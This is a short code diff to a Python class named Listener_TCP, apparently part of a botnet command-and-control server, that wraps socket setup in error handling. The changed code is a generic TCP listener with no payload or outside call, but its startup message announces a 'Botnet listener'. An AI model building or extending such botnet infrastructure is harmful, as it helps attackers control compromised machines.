@@ -19,11 +19,16 @@ class Listener_TCP(threading.Thread):
     def run(self):
 
         # Initial socket setup
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server_address = (self.lhost, self.lport)
-        server.bind(server_address)
-        server.listen(1000)
+        try:
+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_address = (self.lhost, self.lport)
+            server.bind(server_address)
+            server.listen(1000)
+        except Exception as ex:
+                print("[* Server-Msg] Fatal error with listener initialization. Exiting...")
+                print(f"[* Server-Msg] Error: {ex}")
+                os._exit(0)
 
         print(f"[* Listener-Msg] Starting Botnet listener on tcp://{self.lhost}:{str(self.lport)}\n")
 
